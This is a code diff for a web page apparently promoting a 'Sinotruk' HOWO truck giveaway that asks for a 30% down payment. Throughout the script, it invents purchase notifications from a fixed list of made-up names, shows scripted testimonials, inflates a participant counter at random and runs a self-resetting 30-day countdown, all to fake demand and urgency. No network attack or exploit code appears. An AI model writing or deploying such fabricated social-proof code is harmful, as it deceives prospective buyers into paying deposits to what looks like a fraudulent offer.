-
-    // Live Feed Functions
-    function addToLiveFeed(firstName, truckName, totalUpfront) {
-        const feed = document.getElementById('liveFeedList');
-        const entry = document.createElement('div');
-        entry.className = 'feed-item';
-        entry.innerHTML = `<i class="fas fa-truck"></i> ${firstName} just paid 30% down for ${truckName} (${totalUpfront}) · Just now`;
-        feed.prepend(entry);
-        if (feed.children.length > 15) feed.removeChild(feed.lastChild);
-    }
-
-    function showToastMessage(firstName, truckName) {
-        const container = document.getElementById('toastContainer');
-        const toast = document.createElement('div');
-        toast.className = 'toast';
-        toast.innerHTML = `<i class="fas fa-check-circle" style="color:#22C55E;"></i> ${firstName} just paid 30% down for ${truckName}`;
-        container.appendChild(toast);
-        setTimeout(() => toast.remove(), 5000);
-    }
-
-    // Name pool for auto toasts (random intervals 15-45 seconds)
-    const namePool = [
-        "James Wilson", "John Martinez", "Michael Brown", "David Rodriguez", "Robert Anderson", "Chidi Okonkwo", "Thabo Nkosi",
-        "Ahmed Raza", "Rajesh Kumar", "João Silva", "Diego Fernandez", "Omar Al-Mansouri", "Dmitri Volkov", "Maria Santos",
-        "Agus Prasetyo", "Carlos Mendoza", "Sofia Restrepo", "Liam O'Connor", "Yuki Tanaka", "Sipho Dlamini"
-    ];
-
-    // Auto toast and live feed - random intervals
-    function scheduleRandomToast() {
-        const delay = Math.random() * (45000 - 15000) + 15000;
-        setTimeout(() => {
-            const randomPerson = namePool[Math.floor(Math.random() * namePool.length)];
-            const randomTruck = trucks[Math.floor(Math.random() * trucks.length)];
-            showToastMessage(randomPerson.split(' ')[0], randomTruck.name);
-            addToLiveFeed(randomPerson.split(' ')[0], randomTruck.name, randomTruck.upfront30);
-            scheduleRandomToast();
-        }, delay);
-    }
-    scheduleRandomToast();
-
-    // Initial live feed entries
-    const liveFeed = document.getElementById('liveFeedList');
-    liveFeed.innerHTML = '';
-    const initialEntries = [
-        { name: "James Wilson", country: "USA", truck: "HOWO Dump Truck", upfront: "$14,400", time: "2 min ago" },
-        { name: "Chidi Okonkwo", country: "Nigeria", truck: "HOWO Tipper Truck", upfront: "$15,000", time: "5 min ago" },
-        { name: "Ahmed Raza", country: "Pakistan", truck: "HOWO Cargo Truck", upfront: "$13,500", time: "12 min ago" },
-        { name: "João Silva", country: "Brazil", truck: "HOWO Concrete Mixer", upfront: "$15,600", time: "18 min ago" },
-        { name: "Omar Al-Mansouri", country: "Saudi Arabia", truck: "HOWO Tanker Truck", upfront: "$17,400", time: "25 min ago" }
-    ];
-    initialEntries.forEach(entry => {
-        const div = document.createElement('div');
-        div.className = 'feed-item';
-        div.innerHTML = `<i class="fas fa-truck"></i> ${entry.name} (${entry.country}) · ${entry.truck} · 30% down (${entry.upfront}) · ${entry.time}`;
-        liveFeed.appendChild(div);
-    });
-
-    // Testimonials Carousel (Natural, no forced patterns)
-    const testimonialsList = [
-        { name: "Chidi Okonkwo", country: "Nigeria", text: "My HOWO tipper truck has been running daily for 2 years. Best investment for my farm.", truck: "HOWO Tipper Truck" },
-        { name: "Thabo Nkosi", country: "South Africa", text: "Dankie, Sinotruk. My cargo truck delivers produce across Cape Town every week.", truck: "HOWO Cargo Truck" },
-        { name: "João Silva", country: "Brazil", text: "The concrete mixer arrived in perfect condition. My business has grown so much.", truck: "HOWO Concrete Mixer" },
-        { name: "Omar Al-Mansouri", country: "Saudi Arabia", text: "Our fleet of HOWO trucks serves the Riyadh market daily. Excellent quality.", truck: "HOWO Tanker Truck" },
-        { name: "Rajesh Kumar", country: "India", text: "The 10-year financing helped me start my transport company. Dhanyavaad.", truck: "HOWO Semi-Truck" },
-        { name: "Ahmed Raza", country: "Pakistan", text: "My dump truck works perfectly on my construction site in Lahore. Shukriya.", truck: "HOWO Dump Truck" },
-        { name: "Sipho Dlamini", country: "Kenya", text: "My refrigerated truck keeps my dairy products fresh for market. Excellent value.", truck: "HOWO Refrigerated Truck" },
-        { name: "Agus Prasetyo", country: "Indonesia", text: "Terima kasih. My HOWO has been running 3 years without any breakdown.", truck: "HOWO Flatbed Truck" },
-        { name: "Diego Fernandez", country: "Argentina", text: "The semi-truck arrived in 4 weeks. Perfect for my logistics business.", truck: "HOWO Semi-Truck" },
-        { name: "Maria Santos", country: "Philippines", text: "Our family farm uses the light delivery truck daily. Very reliable.", truck: "HOWO Light-Duty Delivery Truck" },
-        { name: "Carlos Mendoza", country: "Mexico", text: "Increíble. The cargo truck paid for itself within 6 months.", truck: "HOWO Heavy-Duty Cargo Truck" },
-        { name: "Dmitri Volkov", country: "Russia", text: "Our tipper trucks handle Siberian winters with no issues. Very durable.", truck: "HOWO Tipper Truck" },
-        { name: "James Wilson", country: "USA", text: "I've bought 3 HOWO trucks for my construction company. Excellent quality for the price.", truck: "HOWO Dump Truck" },
-        { name: "Yuki Tanaka", country: "Japan", text: "The refrigerated truck keeps our seafood fresh during transport. Very satisfied.", truck: "HOWO Refrigerated Truck" },
-        { name: "Sofia Restrepo", country: "Colombia", text: "My flatbed truck transports coffee beans across the mountains. Perfect for our needs.", truck: "HOWO Flatbed Truck" }
-    ];
-
-    const carouselContainer = document.getElementById('testimonialCarousel');
-    let currentSlide = 0;
-    const slidesPerView = 3;
-
-    function renderCarousel() {
-        carouselContainer.innerHTML = '';
-        const start = currentSlide * slidesPerView;
-        const end = start + slidesPerView;
-        const visible = testimonialsList.slice(start, end);
-        visible.forEach(t => {
-            const slide = document.createElement('div');
-            slide.className = 'testimonial-slide';
-            slide.innerHTML = `<strong>${t.name}</strong> (${t.country})<br>“${t.text}”<br><i class="fas fa-check-circle" style="color:#22C55E;"></i> Truck: ${t.truck}`;
-            carouselContainer.appendChild(slide);
-        });
-    }
-    renderCarousel();
-
+    const testimonialsList = [{ name: "Chidi Okonkwo", country: "Nigeria", text: "My HOWO tipper truck has been running daily for 2 years. Best investment for my farm.", truck: "HOWO Tipper Truck" },{ name: "Thabo Nkosi", country: "South Africa", text: "Dankie, Sinotruk. My cargo truck delivers produce across Cape Town every week.", truck: "HOWO Cargo Truck" },{ name: "João Silva", country: "Brazil", text: "The concrete mixer arrived in perfect condition. My business has grown so much.", truck: "HOWO Concrete Mixer" },{ name: "Omar Al-Mansouri", country: "Saudi Arabia", text: "Our fleet of HOWO trucks serves the Riyadh market daily. Excellent quality.", truck: "HOWO Tanker Truck" },{ name: "Rajesh Kumar", country: "India", text: "The 10-year financing helped me start my transport company.", truck: "HOWO Semi-Truck" },{ name: "Ahmed Raza", country: "Pakistan", text: "My dump truck works perfectly on my construction site in Lahore.", truck: "HOWO Dump Truck" },{ name: "Sipho Dlamini", country: "Kenya", text: "My refrigerated truck keeps my dairy products fresh for market. Excellent value.", truck: "HOWO Refrigerated Truck" },{ name: "Agus Prasetyo", country: "Indonesia", text: "Terima kasih. My HOWO has been running 3 years without any breakdown.", truck: "HOWO Flatbed Truck" },{ name: "Diego Fernandez", country: "Argentina", text: "The semi-truck arrived in 4 weeks. Perfect for my logistics business.", truck: "HOWO Semi-Truck" },{ name: "Maria Santos", country: "Philippines", text: "Our family farm uses the light delivery truck daily. Very reliable.", truck: "HOWO Light-Duty Delivery Truck" },{ name: "Carlos Mendoza", country: "Mexico", text: "The cargo truck paid for itself within 6 months.", truck: "HOWO Heavy-Duty Cargo Truck" },{ name: "Dmitri Volkov", country: "Russia", text: "Our tipper trucks handle Siberian winters with no issues. Very durable.", truck: "HOWO Tipper Truck" },{ name: "James Wilson", country: "USA", text: "I've bought 3 HOWO trucks for my construction company. Excellent quality.", truck: "HOWO Dump Truck" },{ name: "Yuki Tanaka", country: "Japan", text: "The refrigerated truck keeps our seafood fresh during transport.", truck: "HOWO Refrigerated Truck" },{ name: "Sofia Restrepo", country: "Colombia", text: "My flatbed truck transports coffee beans across the mountains.", truck: "HOWO Flatbed Truck" }];
+    const carouselContainer = document.getElementById('testimonialCarousel'); let currentSlide = 0; const slidesPerView = 3;
+    function renderCarousel() { carouselContainer.innerHTML = ''; const start = currentSlide * slidesPerView, end = start + slidesPerView, visible = testimonialsList.slice(start, end); visible.forEach(t => { const slide = document.createElement('div'); slide.className = 'testimonial-slide'; slide.innerHTML = `<strong>${t.name}</strong> (${t.country})<br>“${t.text}”<br><i class="fas fa-check-circle" style="color:#22C55E;"></i> Truck: ${t.truck}`; carouselContainer.appendChild(slide); }); } renderCarousel();
     document.getElementById('prevTestimonial').onclick = () => { currentSlide = Math.max(0, currentSlide - 1); renderCarousel(); };
     document.getElementById('nextTestimonial').onclick = () => { const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1; currentSlide = Math.min(maxSlide, currentSlide + 1); renderCarousel(); };
     setInterval(() => { const maxSlide = Math.ceil(testimonialsList.length / slidesPerView) - 1; if (currentSlide >= maxSlide) currentSlide = 0; else currentSlide++; renderCarousel(); }, 8000);
 
-    // Participant counter
     let participantCount = parseInt(localStorage.getItem('participantCount')) || 1247;
     document.getElementById('participantCount').innerText = participantCount.toLocaleString();
     document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString();
     document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString();
     setInterval(() => { const increment = Math.floor(Math.random() * 3) + 1; participantCount += increment; localStorage.setItem('participantCount', participantCount); document.getElementById('participantCount').innerText = participantCount.toLocaleString(); document.getElementById('liveCounterTrust').innerText = participantCount.toLocaleString(); document.getElementById('heroJoinCount').innerText = participantCount.toLocaleString(); }, 8000);
 
-    // Countdown timer (30 days)
     let endTime = localStorage.getItem('sinotruk_endTime');
     if (!endTime) { endTime = Date.now() + (30 * 24 * 60 * 60 * 1000); localStorage.setItem('sinotruk_endTime', endTime); }
-    function updateCountdown() { const diff = endTime - Date.now(); if (diff <= 0) { localStorage.removeItem('sinotruk_endTime'); location.reload(); return; } const days = Math.floor(diff / (1000 * 60 * 60 * 24)); const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)); const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)); const seconds = Math.floor((diff % (1000 * 60)) / 1000); document.getElementById('days').innerText = days.toString().padStart(2, '0'); document.getElementById('hours').innerText = hours.toString().padStart(2, '0'); document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0'); document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0'); }
-    setInterval(updateCountdown, 1000);
-    updateCountdown();
+    function updateCountdown() { const diff = endTime - Date.now(); if (diff <= 0) { localStorage.removeItem('sinotruk_endTime'); location.reload(); return; } const days = Math.floor(diff / (1000 * 60 * 60 * 24)), hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)), minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60)), seconds = Math.floor((diff % (1000 * 60)) / 1000); document.getElementById('days').innerText = days.toString().padStart(2, '0'); document.getElementById('hours').innerText = hours.toString().padStart(2, '0'); document.getElementById('minutes').innerText = minutes.toString().padStart(2, '0'); document.getElementById('seconds').innerText = seconds.toString().padStart(2, '0'); }
+    setInterval(updateCountdown, 1000); updateCountdown();
 
-    // Scroll buttons
     document.getElementById('viewModelsBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
     document.getElementById('heroClaimBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
     document.getElementById('startClaimBtn')?.addEventListener('click', () => { document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
     document.getElementById('navClaimBtn')?.addEventListener('click', (e) => { e.preventDefault(); document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); });
-
-    // Footer navigation
     document.querySelectorAll('.footer-nav-link').forEach(link => { link.addEventListener('click', (e) => { e.preventDefault(); const target = link.getAttribute('data-target'); if (target === 'giveaway') document.querySelector('.countdown-box')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'info') document.getElementById('info-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'instruction') document.getElementById('instruction-section')?.scrollIntoView({ behavior: 'smooth' }); else if (target === 'transactions') document.getElementById('transactions-section')?.scrollIntoView({ behavior: 'smooth' }); }); });
+    document.getElementById('mobileMenuBtn')?.addEventListener('click', () => { document.getElementById('navLinks').classList.toggle('show'); });
 
-    // Check localStorage for existing progress
-    if (localStorage.getItem('sinotruk_step1_completed') === 'true') {
-        claimData = JSON.parse(localStorage.getItem('sinotruk_claimData'));
-        selectedTruck = JSON.parse(localStorage.getItem('sinotruk_selectedTruck'));
-        saveNotification('✓ Application Previously Submitted', `${selectedTruck.name}, Qty: ${claimData.quantity}, Total 30% Down: ${claimData.totalUpfront}`);
-        if (localStorage.getItem('sinotruk_step2_completed') === 'true') {
-            businessData = JSON.parse(localStorage.getItem('sinotruk_businessData'));
-            saveNotification('✓ Business Details Previously Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments`);
-        }
-    }
+    if (localStorage.getItem('sinotruk_step1_completed') === 'true') { claimData = JSON.parse(localStorage.getItem('sinotruk_claimData')); selectedTruck = JSON.parse(localStorage.getItem('sinotruk_selectedTruck')); saveNotification('Application Previously Submitted', `${selectedTruck.name}, Qty: ${claimData.quantity}, Total 30% Down: ${claimData.totalUpfront}`); if (localStorage.getItem('sinotruk_step2_completed') !== 'true') { setTimeout(() => { if (confirm('You have an incomplete application. Continue where you left off?')) showBusinessModal(); }, 500); } else { businessData = JSON.parse(localStorage.getItem('sinotruk_businessData')); saveNotification('Business Details Previously Submitted', `${businessData.businessName || 'Individual'}, ${businessData.paymentTerms} payments`); setTimeout(() => { showSuccess(); }, 500); } }
     updateBell();
-
     renderTrucks();
 </script>
 </body>
